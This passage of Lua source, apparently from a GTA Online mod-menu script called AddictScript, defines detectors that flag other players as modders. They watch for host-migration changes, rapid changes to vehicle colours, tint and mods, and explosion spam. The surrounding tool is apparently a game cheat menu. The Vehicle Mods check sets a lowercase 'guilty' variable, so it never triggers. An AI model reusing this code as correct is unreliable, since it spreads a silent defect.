feature["Altered Session Host Migration Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Altered Script Host Migration Detection"] = menu.add_feature("Altered Script Host Migration", "value_str", localparents["Altered Migration Detection"].id, function(f)
	local sh
	local sh_name
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			if script.get_host_of_this_script() ~= -1 and script.get_host_of_this_script() ~= nil then
				sh = script.get_host_of_this_script()
				sh_name = player.get_player_name(sh)
				system.yield(2000)
				if sh ~= -1 and sh ~= nil then
					local new_sh = script.get_host_of_this_script()
					if sh ~= new_sh and new_sh ~= -1 and new_sh ~= nil and sh_name ~= nil then
						if player.is_player_valid(new_sh) then
							local Continue = true
							local GiveSHFeat = menu.get_feature_by_hierarchy_key("online.online_players.player_" .. new_sh .. ".give_script_host")
							if GiveSHFeat then
								if GiveSHFeat.on then
									Continue = false
								end
							end
							if Continue then
								if player_leave_timer < utils.time_ms() then
									if not ModderDetections.AlteredMigration.ScriptHost[new_sh] then
										if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(new_sh)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(new_sh)) then
											if f.value == 0 or f.value == 2 then
												player.set_player_as_modder(new_sh, custommodderflags["Altered Migration"])
											end
											if f.value == 0 or f.value == 1 then
												menu.notify("Player: " .. tostring(player.get_player_name(new_sh)) .. "\nReason: Altered Migration | Script Host", "AddictScript Modder Detection", 12, NotifyColours["orange"])
											end
											ModderDetections.AlteredMigration.ScriptHost[new_sh] = true
										end
									end
								end
							end
						end
					end
				end
			end
		else
			sh = nil
			sh_name = nil
		end
		system.yield(0)
	end
end)
feature["Altered Script Host Migration Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Modded Vehicle Mods Detection"] = menu.add_feature("Modded Vehicle Mods", "parent", localparents["Modder Detections"].id)

feature["Wheel Type Detection"] = menu.add_feature("Wheel Type", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_wheel_type = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_wheel_type[pid] = vehicle.get_vehicle_wheel_type(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_wheel_type[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_wheel_type[pid] ~= nil then
								if vehicle.get_vehicle_wheel_type(player.get_player_vehicle(pid)) ~= player_veh_wheel_type[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.WheelType[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Wheel Type", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.WheelType[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_wheel_type[pid] = nil
				end
			end
		end
	end
end)
feature["Wheel Type Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Window Tint Detection"] = menu.add_feature("Window Tint", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_window_tint = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_window_tint[pid] = vehicle.get_vehicle_window_tint(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_window_tint[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_window_tint[pid] ~= nil then
								if vehicle.get_vehicle_window_tint(player.get_player_vehicle(pid)) ~= player_veh_window_tint[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.WindowTint[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Window Tint", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.WindowTint[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_window_tint[pid] = nil
				end
			end
		end
	end
end)
feature["Window Tint Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Headlight Colour Detection"] = menu.add_feature("Headlight Colour", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_headl_colour = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_headl_colour[pid] = vehicle.get_vehicle_headlight_color(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_headl_colour[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_headl_colour[pid] ~= nil then
								if vehicle.get_vehicle_headlight_color(player.get_player_vehicle(pid)) ~= player_veh_headl_colour[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.HeadlightColour[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Headlight Colour", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.HeadlightColour[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_headl_colour[pid] = nil
				end
			end
		end
	end
end)
feature["Headlight Colour Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Wheel Colour Detection"] = menu.add_feature("Wheel Colour", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_wheel_colour = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_wheel_colour[pid] = vehicle.get_vehicle_custom_wheel_colour(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_wheel_colour[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_wheel_colour[pid] ~= nil then
								if vehicle.get_vehicle_custom_wheel_colour(player.get_player_vehicle(pid)) ~= player_veh_wheel_colour[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.WheelColour[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Wheel Colour", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.WheelColour[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_wheel_colour[pid] = nil
				end
			end
		end
	end
end)
feature["Wheel Colour Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Primary Colour Detection"] = menu.add_feature("Primary Colour", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_prim_colour = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_prim_colour[pid] = vehicle.get_vehicle_custom_primary_colour(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_prim_colour[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_prim_colour[pid] ~= nil then
								if vehicle.get_vehicle_custom_primary_colour(player.get_player_vehicle(pid)) ~= player_veh_prim_colour[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.PrimaryColour[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Primary Colour", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.PrimaryColour[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_prim_colour[pid] = nil
				end
			end
		end
	end
end)
feature["Primary Colour Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Secondary Colour Detection"] = menu.add_feature("Secondary Colour", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_sec_colour = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						player_veh_sec_colour[pid] = vehicle.get_vehicle_custom_secondary_colour(player.get_player_vehicle(pid))
					else
						player_veh_id[pid] = nil
						player_veh_sec_colour[pid] = nil
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							if player_veh_sec_colour[pid] ~= nil then
								if vehicle.get_vehicle_custom_secondary_colour(player.get_player_vehicle(pid)) ~= player_veh_sec_colour[pid] then
									Guilty = true
								end
							end
							if Guilty then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.SecondaryColour[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Secondary Colour", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.SecondaryColour[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					player_veh_sec_colour[pid] = nil
				end
			end
		end
	end
end)
feature["Secondary Colour Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Vehicle Mods Detection"] = menu.add_feature("Vehicle Mods", "value_str", localparents["Modded Vehicle Mods Detection"].id, function(f)
	if f.on then
		local player_veh_id = {}
		local player_veh_mods = {
			["0"] = {},
			["1"] = {},
			["2"] = {},
			["3"] = {},
			["4"] = {},
			["5"] = {},
			["6"] = {},
			["7"] = {},
			["8"] = {},
			["9"] = {},
			["10"] = {},
			["11"] = {},
			["12"] = {},
			["13"] = {},
			["14"] = {},
			["15"] = {},
			["16"] = {},
			["17"] = {},
			["18"] = {},
			["19"] = {},
			["20"] = {},
			["21"] = {},
			["22"] = {},
			["23"] = {},
			["24"] = {},
			["25"] = {},
			["26"] = {},
			["27"] = {},
			["28"] = {},
			["29"] = {},
			["30"] = {},
			["31"] = {},
			["32"] = {},
			["33"] = {},
			["34"] = {},
			["35"] = {},
			["36"] = {},
			["37"] = {},
			["38"] = {},
			["39"] = {},
			["40"] = {},
			["41"] = {},
			["42"] = {},
			["43"] = {},
			["44"] = {},
			["45"] = {},
			["46"] = {},
			["47"] = {},
			["48"] = {},
			["49"] = {}
		}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 2000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						player_veh_id[pid] = player.get_player_vehicle(pid)
						for i = 0, 49 do
							player_veh_mods["" .. i .. ""][pid] = vehicle.get_num_vehicle_mods(player.get_player_vehicle(pid), i)
						end
					else
						player_veh_id[pid] = nil
						for i = 0, 49 do
							player_veh_mods["" .. i .. ""][pid] = nil
						end
					end
				end
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not script_func.is_loading_into_session() and player.is_player_in_any_vehicle(pid) and utilities.get_spectator_of_player(pid) == nil and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) > 4 and utilities.get_distance_between(player.get_player_coords(pid), player.get_player_coords(player.player_id())) < 1000 and player.get_player_coords(pid).z > 0 and player.get_player_coords(pid).z < 200 and player_veh_id[pid] ~= nil and not network.has_control_of_entity(player.get_player_vehicle(pid)) and not entity.is_entity_dead(player.get_player_ped(pid)) and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not player.is_player_god(pid) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not entity.is_entity_in_water(player.get_player_vehicle(pid)) and not script_func.is_player_loading(pid) then
						if player_veh_id[pid] ~= nil and player_veh_id[pid] == player.get_player_vehicle(pid) and entity.get_entity_model_hash(player.get_player_vehicle(pid)) ~= 2382949506 then
							local Guilty = false
							local entries = 0
							for i = 0, 49 do
								if player_veh_mods["" .. i .. ""][pid] ~= nil then
									if vehicle.get_num_vehicle_mods(player.get_player_vehicle(pid), i) ~= player_veh_mods["" .. i .. ""][pid] then
										guilty = true
										entries = entries + 1
									end
								end
							end
							if Guilty and entries > 2 then
								local entity_owner = memory.get_entity_owner(player.get_player_vehicle(pid))
								if entity_owner ~= nil and entity_owner ~= player.player_id() then
									if player.is_player_valid(entity_owner) then
										if not ModderDetections.ModdedVehicleMods.VehicleMods[entity_owner] then
											if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(entity_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(entity_owner)) then
												if f.value == 0 or f.value == 2 then
													player.set_player_as_modder(entity_owner, custommodderflags["Modded Vehicle Mods"])
												end
												if f.value == 0 or f.value == 1 then
													menu.notify("Player: " .. tostring(player.get_player_name(entity_owner)) .. "\nReason: Modded Vehicle Mods | Vehicle Mods", "AddictScript Modder Detection", 12, NotifyColours["orange"])
												end
												ModderDetections.ModdedVehicleMods.VehicleMods[entity_owner] = true
											end
										end
									end
								end
							end
						end
					end
					player_veh_id[pid] = nil
					for i = 0, 49 do
						player_veh_mods["" .. i .. ""][pid] = nil
					end
				end
			end
		end
	end
end)
feature["Vehicle Mods Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Modded Explosion Detection"] = menu.add_feature("Modded Explosion", "parent", localparents["Modder Detections"].id)
--[[
feature["Invalid Explosion Type Detection"] = menu.add_feature("Invalid Explosion Type", "value_str", localparents["Modded Explosion Detection"].id, function(f)
	while f.on do
		system.yield(0)
		if network.is_session_started() then
			if natives.IS_EXPLOSION_IN_AREA(59, player.get_player_coords(player.player_id()).x - 3000, player.get_player_coords(player.player_id()).y - 3000, player.get_player_coords(player.player_id()).z - 3000, player.get_player_coords(player.player_id()).x + 3000, player.get_player_coords(player.player_id()).y + 3000, player.get_player_coords(player.player_id()).z + 3000) then
				local explo_owner = player.get_player_from_ped(natives.GET_OWNER_OF_EXPLOSION_IN_ANGLED_AREA(59, player.get_player_coords(player.player_id()).x - 3000, player.get_player_coords(player.player_id()).y - 3000, player.get_player_coords(player.player_id()).z - 3000, player.get_player_coords(player.player_id()).x + 3000, player.get_player_coords(player.player_id()).y + 3000, player.get_player_coords(player.player_id()).z + 3000, 3000.0))
				if player.is_player_valid(explo_owner) and player.get_player_coords(explo_owner).z > 0 then
					if player.is_player_valid(explo_owner) and explo_owner ~= player.player_id() then
						if not ModderDetections.ModdedExplosion.InvalidExplosionType[explo_owner] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(explo_owner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(explo_owner)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(explo_owner, custommodderflags["Modded Explosion"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(explo_owner)) .. "\nReason: Modded Explosion | Invalid Explosion Type", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.ModdedExplosion.InvalidExplosionType[explo_owner] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Invalid Explosion Type Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})
]]
feature["Explosion Spam Detection"] = menu.add_feature("Explosion Spam", "value_str", localparents["Modded Explosion Detection"].id, function(f)
	if f.on then
		for i = 0, 31 do
			MiscPlayerCount.NetExplosionEvent[i] = 0
		end
		if eventhooks["Explosion Spam Detection"] == nil then
			eventhooks["Explosion Spam Detection"] = hook.register_net_event_hook(function(source, target, eventId)
				if eventId == NetEventID["EXPLOSION"] then
					MiscPlayerCount.NetExplosionEvent[source] = MiscPlayerCount.NetExplosionEvent[source] + 1
				end
			end)
		end
		while f.on do
			for i = 0, 31 do
